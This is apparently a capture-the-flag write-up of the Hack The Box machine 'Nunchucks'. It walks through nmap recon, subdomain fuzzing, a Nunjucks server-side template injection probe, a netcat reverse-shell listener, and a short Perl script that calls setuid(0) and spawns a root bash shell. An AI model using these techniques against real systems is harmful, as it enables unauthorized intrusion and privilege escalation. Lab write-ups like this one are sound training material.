# Nunchucks

## Recon
```console
# nmap -Pn --open -sC -sV 10.10.11.122

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA)
|   256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA)
|_  256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://nunchucks.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Nunchucks - Landing Page
| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
| Not valid before: 2021-08-30T15:42:24
|_Not valid after:  2031-08-28T15:42:24
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Subdomain Enum
```console
# wfuzz -H "Host: FUZZ.nunchucks.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 30587 https://nunchucks.htb
```

Updating `/etc/hosts` file:
```
# HTB
10.10.11.122 nunchucks.htb store.nunchucks.htb
```

## Initial Access 
### Server-side Template Injection (NUNJUCKS)
`POST /api/submit` endpoint is vulnerable to SSTI. 

Request:
```json
{
    "email":"test@test{{7*7}}"
}
```

Response:
```json
{
    "response":"You will receive updates on the following email address: test@test49."
}
```

Exploit reference: http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine

Using `ssti_exploit.py`, we can get a reverse shell:

```console
# nc -lvnp 9001                    
listening on [any] 9001 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.122] 45644
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(david) gid=1000(david) groups=1000(david)
```

### user.txt
```console
$ cd /home/david
$ ls
user.txt
$ cat user.txt
853b**REDACTED**956e8
```

## Privilege Escalation
### david --> root

Finding an interesting backup script 
```console
david@nunchucks:/opt$ ls -la
ls -la
total 16
drwxr-xr-x  3 root root 4096 Oct 28 17:03 .
drwxr-xr-x 19 root root 4096 Oct 28 17:03 ..
-rwxr-xr-x  1 root root  838 Sep  1 12:53 backup.pl
drwxr-xr-x  2 root root 4096 Oct 28 17:03 web_backups
```

`backup.pl` is using `POSIX::setuid(0)` to run the script as `root`

```perl
#!/usr/bin/perl
use strict;
use POSIX qw(strftime);
use DBI;
use POSIX qw(setuid); 
POSIX::setuid(0); 

my $tmpdir        = "/tmp";
my $backup_main = '/var/www';
my $now = strftime("%Y-%m-%d-%s", localtime);
my $tmpbdir = "$tmpdir/backup_$now";

sub printlog
{
    print "[", strftime("%D %T", localtime), "] $_[0]\n";
}

sub archive
{
    printlog "Archiving...";
    system("/usr/bin/tar -zcf $tmpbdir/backup_$now.tar $backup_main/* 2>/dev/null");
    printlog "Backup complete in $tmpbdir/backup_$now.tar";
}

if ($> != 0) {
    die "You must run this script as root.\n";
}

printlog "Backup starts.";
mkdir($tmpbdir);
&archive;
printlog "Moving $tmpbdir/backup_$now to /opt/web_backups";
system("/usr/bin/mv $tmpbdir/backup_$now.tar /opt/web_backups/");
printlog "Removing temporary directory";
rmdir($tmpbdir);
printlog "Completed";
```

### exploit.pl
We can create the following exploit script and make it executable. 

```perl
#!/usr/bin/perl
use POSIX qw(strftime);
use POSIX qw(setuid);
POSIX::setuid(0);

exec "/bin/bash"
```

### root.txt

```console
david@nunchucks:/tmp$ ./exploit.pl
./exploit.pl
root@nunchucks:/tmp# id  
id
uid=0(root) gid=1000(david) groups=1000(david)
root@nunchucks:/tmp# cat /root/root.txt
cat /root/root.txt
66fb6**REDACTED**3c492
```